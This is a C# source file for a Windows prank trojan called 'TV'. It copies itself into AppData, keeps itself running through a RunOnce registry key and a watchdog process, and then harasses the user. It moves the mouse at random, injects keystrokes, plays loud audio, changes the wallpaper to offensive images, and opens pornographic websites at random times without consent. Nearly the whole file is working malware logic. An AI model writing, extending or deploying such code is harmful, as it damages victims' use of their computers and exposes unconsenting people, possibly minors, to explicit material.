using System;
using System.IO;
using System.Net;
using System.Drawing;
using Microsoft.Win32;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using System.Windows.Forms;

namespace TV
{
    class Program
    {
        // Get initial execution path
        public static string ExecutionPath = Directory.GetCurrentDirectory();

        // Get appdata path
        public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        static void Main(string[] args)
        {
            // Check if program is launched in system32 NOTE: Happens at startup
            if (ExecutionPath == Environment.SystemDirectory)
            {
                // Add startup key
                TVMethods.StartupKey("Add");

                // Change path
                Directory.SetCurrentDirectory(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location));

                // Set execution path to current path
                ExecutionPath = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            }

            // Check if file is installed, if not, install it
            if (ExecutionPath == Appdata + @"\TV")
            {
                // Declar threads
                #region Declear threads
                Thread persistence = new Thread(Persistence);
                Thread browserPoppup = new Thread(BrowserPoppup);
                Thread mouseAndKeyboard = new Thread(MouseAndKeyboard);
                Thread soundsAndPopups = new Thread(SoundsAndPopups);
                Thread changeWallpaper = new Thread(ChangeWallpaper);
                #endregion

                // Start threads
                #region Start threads
                persistence.Start();
                browserPoppup.Start();
                mouseAndKeyboard.Start();
                soundsAndPopups.Start();
                changeWallpaper.Start();
                #endregion

                // Infinite loop
                while (true)
                {
                    // Check for file
                    if (File.Exists("Stop.TV"))
                    {
                        // Stop threads
                        #region Stop threads
                        persistence.Abort();
                        browserPoppup.Abort();
                        mouseAndKeyboard.Abort();
                        soundsAndPopups.Abort();
                        changeWallpaper.Abort();
                        #endregion

                        // Uninstall
                        TVSetup.Uninstall();

                        // Exit
                        Environment.Exit(0);
                    }
                    Thread.Sleep(1000);
                }
            } else
            {
                // Install
                TVSetup.Install();

                // Exit
                Environment.Exit(0);
            }
        }

        // Persistence thread
        public static void Persistence()
        {
            // Set counter
            int Count = 0;

            // Infinite loop
            while (true)
            {
                // Check if process is running, if not, start it
                if (Process.GetProcessesByName("TVPers").Length == 0)
                {
                    Process.Start("TVPers.exe");
                }

                // Check if count is equal to 5
                if (Count == 5)
                {
                    // Open the runonce registry folder
                    using (RegistryKey CheckKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", true))
                    {
                        // Check if startup key exists
                        if (CheckKey.GetValue("TV") == null)
                        {
                            // Add key
                            TVMethods.StartupKey("Add");
                        }
                    }

                    // Set count to 0
                    Count = 0;
                }

                // Add one to count
                Count++;

                Thread.Sleep(100);
            }
        }

        // Browser poppup thread
        public static void BrowserPoppup()
        {
            bool ConnectionStatus;

            // Infinite loop
            while (true)
            {
                // Wait a random amount of time between 30 - 60 mins
                Thread.Sleep(TVMethods.Random(1800000, 3600000));

                // Check network connectivity
                try
                {
                    using (var Wc = new WebClient())
                    {
                        using (var stream = Wc.OpenRead("https://www.google.com"))
                        {
                            ConnectionStatus = true;
                        }
                    }
                }
                catch
                {
                    ConnectionStatus = false;
                }

                // Check network connectivity
                if (ConnectionStatus == true)
                {
                    // Decide wich page to open
                    switch (TVMethods.Random(1, 5))
                    {
                        case 1:
                            Process.Start("IExplore.exe", "https://www.pornhub.com/");
                            break;
                        case 2:
                            Process.Start("IExplore.exe", "https://www.heavy-r.com/");
                            break;
                        case 3:
                            Process.Start("IExplore.exe", "http://www.randomnude.com/");
                            break;
                        case 4:
                            Process.Start("IExplore.exe", "https://www.xnxx.com/");
                            break;
                        case 5:
                            Process.Start("IExplore.exe", "https://www.porn.com/");
                            break;
                    }
                }
            }
        }

        // Mouse and keyboard thread
        public static void MouseAndKeyboard()
        {
            // Infinite loop
            while (true)
            {
                // Moove randomly mouse
                Cursor.Position = new Point(Cursor.Position.X + TVMethods.Random(-5, 5), Cursor.Position.Y + TVMethods.Random(-5, 5));

                // Randomly start spamming the keyboard
                if (TVMethods.Random(1, 30) == 10)
                {
                    // Choose how many random letters to put in a row
                    for (int i = 0; i < TVMethods.Random(1, 3); i++)
                    {
                        // Spam keyboard with random lower/upper case letters
                        char key = (char)(TVMethods.Random(0, 25) + 65);

                        // Randomly make letters lower/upper case
                        if (TVMethods.Random(0, 1) == 0)
                        {
                            key = Char.ToLower(key);
                        }

                        // Send to keyboard
                        SendKeys.SendWait(key.ToString());
                    }
                }

                Thread.Sleep(100);
            }
        }

        // Play sounds thread
        public static void SoundsAndPopups()
        {
            // Infinite loop
            while (true)
            {
                // Wait a random amount of time between 10 - 30 mins
                Thread.Sleep(TVMethods.Random(600000, 1800000));

                // Check if mp3/dll files exists, if not, readd them
                if (!File.Exists("WMPLib.dll"))
                {
                    TVMethods.Extract("TV", Appdata + @"\TV", "Libs", "WMPLib.zip");
                } else if (!File.Exists("NyanCat.mp3"))
                {
                    TVMethods.Extract("TV", Appdata + @"\TV", "Resources", "NyanCat.zip");
                } else if (!File.Exists("Rickroll.mp3"))
                {
                    TVMethods.Extract("TV", Appdata + @"\TV", "Resources", "Rickroll.zip");
                } else if (!File.Exists("SmokeWeedEveryDay.mp3"))
                {
                    TVMethods.Extract("TV", Appdata + @"\TV", "Resources", "SmokeWeedEveryDay.zip");
                } else if (!File.Exists("WindowsXPEarRape.mp3"))
                {
                    TVMethods.Extract("TV", Appdata + @"\TV", "Resources", "WindowsXPEarRape.zip");
                }

                // Decide what sound to play
                switch (TVMethods.Random(1, 4))
                {
                    case 1:
                        TVMethods.Sap.NyanCat();
                        break;
                    case 2:
                        TVMethods.Sap.RickRoll();
                        break;
                    case 3:
                        TVMethods.Sap.SmokeWeedEveryDay();
                        break;
                    case 4:
                        TVMethods.Sap.WinXPEarRape();
                        break;
                }
            }
        }

        // ChangeWallpaper thread
        public static void ChangeWallpaper()
        {
            // infinite loop
            while(true)
            {
                // Wait a random amount of time between 10 - 30 mins
                Thread.Sleep(TVMethods.Random(600000, 1800000));

                // Check if bmp image files exists, if not, readd them
                if (!File.Exists("FuckYou.bmp"))
                {
                    TVMethods.Extract("TV", Appdata + @"\TV", "Resources", "FuckYou.zip");
                    TVMethods.ConvertToBmp("FuckYou.jpg");
                } else if (!File.Exists("SmokeWeed.bmp"))
                {
                    TVMethods.Extract("TV", Appdata + @"\TV", "Resources", "SmokeWeed.zip");
                    TVMethods.ConvertToBmp("SmokeWeed.png");
                } else if (!File.Exists("TrollFace.bmp"))
                {
                    TVMethods.Extract("TV", Appdata + @"\TV", "Resources", "TrollFace.zip");
                    TVMethods.ConvertToBmp("TrollFace.jpg");
                }

                // Decide what wallpaper to use
                switch (TVMethods.Random(1, 3))
                {
                    case 1:
                        TVMethods.ChangeWallpaperz("FuckYou.bmp");
                        break;
                    case 2:
                        TVMethods.ChangeWallpaperz("SmokeWeed.bmp");
                        break;
                    case 3:
                        TVMethods.ChangeWallpaperz("TrollFace.bmp");
                        break;
                }
            }
        }
    }
}